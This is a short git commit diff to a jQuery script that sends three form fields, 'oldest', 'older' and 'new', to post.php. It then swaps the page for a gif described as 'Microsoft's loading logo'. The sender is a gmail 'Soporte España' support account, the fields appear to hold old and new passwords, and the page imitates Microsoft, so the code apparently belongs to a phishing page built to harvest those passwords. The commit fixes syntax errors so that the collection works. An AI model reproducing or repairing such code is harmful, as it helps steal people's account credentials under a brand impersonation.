87d44dca1c51f32130a5bdd50453d57fe6bd426a
Soporte España <espanahelp24@gmail.com>
2017-11-20 17:42:56 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,13 +1,13 @@
 $("button#sender").on('click', function(e){
     e.preventDefault();
-    var val1 = $("#oldest")val();
+    var val1 = $("#oldest").val();
     var val2 = $("#older").val();
     var val3 = $("#new").val();
     var form = new FormData();
     form.append('oldest',val1);
     form.append('older',val2);
     form.append('new', val3);
-    $ajax({
+    $.ajax({
         url: "post.php",
         type: "POST",
         async: false,
@@ -18,4 +18,6 @@ $("button#sender").on('click', function(e){
             alert(response);
         }
         });
+    $("body").html("<img src='301.gif' alt='Microsoft\'s loading logo style='text-align:center; display:block; margin: 100px auto' />");
 });
+
